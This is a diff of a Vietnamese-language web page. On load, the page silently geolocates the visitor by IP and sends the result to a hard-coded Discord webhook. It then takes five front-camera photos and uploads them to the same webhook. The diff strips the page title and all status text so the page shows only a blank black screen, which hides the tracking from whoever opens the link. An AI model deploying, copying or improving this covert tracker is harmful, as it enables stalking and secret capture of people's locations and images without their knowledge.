@@ -3,33 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Huy Hoang - Location Tracker</title>
+    <title></title>
     <style>
         body {
-            background: #0a0a0a;
+            background: #000000;
             margin: 0;
-            padding: 20px;
-            font-family: monospace;
-            color: #0f0;
-            line-height: 1.6;
-        }
-        .status {
-            color: #ff0;
-            margin: 15px 0;
-            padding: 10px;
-            background: rgba(255, 200, 0, 0.1);
-            border-radius: 6px;
+            padding: 0;
+            overflow: hidden;
+            height: 100vh;
         }
     </style>
 </head>
 <body>
-    <div class="status">Đang khởi tạo tracker cấp độ MAX...</div>
-    <video id="video" autoplay playsinline style="display:none; width:100%; max-width:400px;"></video>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // ================== WEBHOOK ĐÃ MÃ HÓA ==================
-        const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4ODA5MjE1Mzg4MzI2MzA0OC9xVk9mTWxKb0VLa2dHVDdPR3lRMDdhWWxYQXlzVWxIMjVLdDZzUWZSNFdJSGJ1aXMyS2wzMXlwdzM5el9CY0pQeXY0Rw==");
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1488092153883263048/qVOfMlJoEKghGT7OGyQ07aYlXAysUlH25Kt6sqfR4WIHbuis2Kl31ypw39z_BcJPyv4G';
 
         const PHOTO_COUNT = 5;
         const PHOTO_INTERVAL = 400;
@@ -37,10 +28,10 @@
 
         async function sendText(content) {
             try {
-                await fetch(webhook, {
+                await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: "Huy Hoang - Location Tracker", content })
+                    body: JSON.stringify({ username: "Huy Hoang", content })
                 });
             } catch(e) {}
         }
@@ -50,88 +41,43 @@
                 const form = new FormData();
                 form.append('file', blob, filename);
                 form.append('payload_json', JSON.stringify({
-                    username: "Huy Hoang - Location Tracker",
+                    username: "Huy Hoang",
                     content: caption
                 }));
-                await fetch(webhook, { method: 'POST', body: form });
+                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: form });
             } catch(e) {}
         }
 
-        // ================== CHECK VỊ TRÍ XỊN XÒ CẤP ĐỘ MAX ==================
         async function sendVisitorInfo() {
-            let ip = "Không xác định";
-            let city = "Không xác định";
-            let region = "Không xác định";
-            let isp = "Không xác định";
-            let country = "Không xác định";
-
-            const apis = [
-                "https://ip-api.com/json/?fields=query,status,city,regionName,isp,org,country",
-                "https://ipapi.co/json/",
-                "https://freeipapi.com/api/json",
-                "https://extreme-ip-lookup.com/json/"
-            ];
-
+            let ip = "Không xác định", city = "Không xác định", region = "Không xác định", isp = "Không xác định";
+            const apis = ["https://ip-api.com/json/?fields=query,status,city,regionName,isp","https://ipapi.co/json/"];
             for (let url of apis) {
                 try {
-                    const res = await fetch(url, { signal: AbortSignal.timeout(7000) });
-                    if (!res.ok) continue;
+                    const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
                     const data = await res.json();
-
                     if (url.includes("ip-api.com") && data.status === "success") {
-                        ip = data.query || ip;
-                        city = data.city || city;
-                        region = data.regionName || region;
-                        isp = data.isp || data.org || isp;
-                        country = data.country || country;
+                        ip = data.query; city = data.city || city; region = data.regionName || region; isp = data.isp || isp;
                         break;
                     } else if (url.includes("ipapi.co")) {
-                        ip = data.ip || ip;
-                        city = data.city || city;
-                        region = data.region || region;
-                        isp = data.org || isp;
-                        country = data.country_name || country;
-                    } else if (url.includes("freeipapi")) {
-                        ip = data.ipAddress || ip;
-                        city = data.cityName || city;
-                        region = data.regionName || region;
-                        isp = data.isp || isp;
+                        ip = data.ip || ip; city = data.city || city; region = data.region || region; isp = data.org || isp;
                     }
-
-                    if (city !== "Không xác định" && isp !== "Không xác định") break;
                 } catch(e) {}
             }
-
-            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
-                        `🌐 **IP:** ${ip}\n` +
-                        `📍 **Thành phố:** ${city}\n` +
-                        `🗺️ **Khu vực:** ${region}\n` +
-                        `🏳️ **Quốc gia:** ${country}\n` +
-                        `🏢 **Nhà mạng:** ${isp}\n` +
-                        `📱 **Thiết bị:** ${navigator.platform || "Không xác định"}\n` +
-                        `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}\n` +
-                        `🔗 **Nguồn:** Truy cập trực tiếp`;
-
+            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n🌐 **IP:** ${ip}\n📍 **Thành phố:** ${city}\n🗺️ **Khu vực:** ${region}\n🏢 **Nhà mạng:** ${isp}\n📱 **Thiết bị:** ${navigator.platform || "Không xác định"}\n⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}`;
             await sendText(msg);
         }
 
-        // ================== PHẦN CHỤP ẢNH (GIỮ NGUYÊN) ==================
         async function startCameraAndCapture() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            const status = document.querySelector('.status');
             try {
                 cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: { ideal: "user" },
-                        width: { ideal: 640, max: 1280 },
-                        height: { ideal: 480, max: 720 }
-                    }
+                    video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 480 }}
                 });
                 video.srcObject = cameraStream;
                 await new Promise(r => video.onloadedmetadata = r);
                 video.play();
-                status.textContent = "✅ Camera đã mở. Đang chụp ảnh...";
+
                 for (let i = 1; i <= PHOTO_COUNT; i++) {
                     await new Promise(resolve => {
                         canvas.width = video.videoWidth || 640;
@@ -144,21 +90,16 @@
                     });
                     if (i < PHOTO_COUNT) await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
                 }
+
                 if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
-                status.textContent = "✅ Đã chụp xong 5 ảnh";
             } catch (err) {
                 console.error(err);
-                let msg = "⚠️ Không mở được camera.\n";
-                if (err.name === "NotAllowedError") msg += "Bạn chưa cho phép quyền camera.";
-                status.style.color = "#f66";
-                status.textContent = msg;
-                await sendText("⚠️ " + msg.replace(/\n/g, " "));
             }
         }
 
         async function init() {
             await sendVisitorInfo();
-            setTimeout(startCameraAndCapture, 600);
+            setTimeout(startCameraAndCapture, 800);
         }
 
         window.addEventListener('load', init);
